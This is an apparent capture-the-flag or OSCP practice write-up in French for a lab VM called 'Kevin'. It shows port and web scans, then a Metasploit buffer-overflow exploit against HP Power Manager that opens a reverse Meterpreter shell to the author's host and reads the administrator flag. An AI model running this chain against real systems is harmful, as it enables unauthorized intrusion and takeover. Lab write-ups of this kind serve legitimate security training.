  # Kevin

	sudo masscan -p1-65535,U:1-65535 192.168.198.45 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.198.45 -oN nmap.txt
	feroxbuster --silent -u http://192.168.198.45
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	80/tcp open http GoAhead WebServer  
	135/tcp open msrpc Microsoft Windows RPC  
	139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
	445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)  
	3389/tcp open ssl/ms-wbt-server?  
	3573/tcp open tag-ups-1?  
	49152/tcp open msrpc Microsoft Windows RPC  
	49153/tcp open msrpc Microsoft Windows RPC  
	49154/tcp open msrpc Microsoft Windows RPC  
	49155/tcp open msrpc Microsoft Windows RPC  
	49158/tcp open msrpc Microsoft Windows RPC  
	49159/tcp open msrpc Microsoft Windows RPC
  


La description de la VM indique "Effective enumeration will save you time." alors j'ai complété mes scans en élargissant un peu l'énumération : 

	nikto -h http://192.168.198.45
	feroxbuster --silent -u http://192.168.198.45 -w ~/wordlists/raft-large-directories.txt
	enum4linux -a 192.168.198.45
	nmap -A -p80,135,139,445,3389,3573 192.168.198.45

Rien de spécial mais en parallèle j'ai trouvé plusieurs exploits qui pourraient correspondre à cette VM : 

- RCE sur des serveurs web GoAhead : https://github.com/fssecur3/goahead-rce-exploit/blob/main/exploit.py
- Buffer Overflow sur HP Power Manager Administration : https://www.exploit-db.com/exploits/10099

Le premier était un rabbit hole, mais j'ai trouvé le deuxième sur Metasploit. J'ai décidé de passer par Metasploit parce que je ne suis pas du tout au point sur ce type d'attaque, et que si un buffer overflow tombait pour mon examen OSCP je sauterais la VM ou utiliserais directement la cartouche unique Metasploit dessus : 

	msfconsole
	msf6 > search HP Power Manager
	msf6 > use 0
	msf6 exploit(windows/http/hp_power_manager_filename) > show options
	msf6 exploit(windows/http/hp_power_manager_filename) > set LHOST 192.168.45.236
	msf6 exploit(windows/http/hp_power_manager_filename) > set RHOSTS 192.168.198.45
	msf6 exploit(windows/http/hp_power_manager_filename) > run
	...
	meterpreter > shell
	whoami
	type C:\Users\Administrator\Desktop\proof.txt
